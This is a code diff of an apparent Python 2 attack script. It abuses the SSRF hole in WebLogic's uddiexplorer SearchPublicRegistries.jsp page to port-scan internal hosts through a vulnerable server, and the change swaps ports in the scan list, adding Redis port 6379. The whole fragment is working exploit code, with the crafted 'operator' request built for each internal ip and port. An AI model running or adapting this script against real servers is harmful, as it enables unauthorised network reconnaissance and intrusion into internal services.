@@ -6,7 +6,7 @@ import time
 import thread
 import requests
 def scan(ip_str):
-  ports = ('21','22','23','53','80','135','139','443','445','1080','1433','1521','3306','3389','4899','8080','7001','8000',)
+  ports = ('21','22','23','53','80','135','139','443','445','1080','1433','6379','3306','3389','8080','7001','8000',)
   for port in ports:
     exp_url = "http://weblogic.0day5.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
     try:
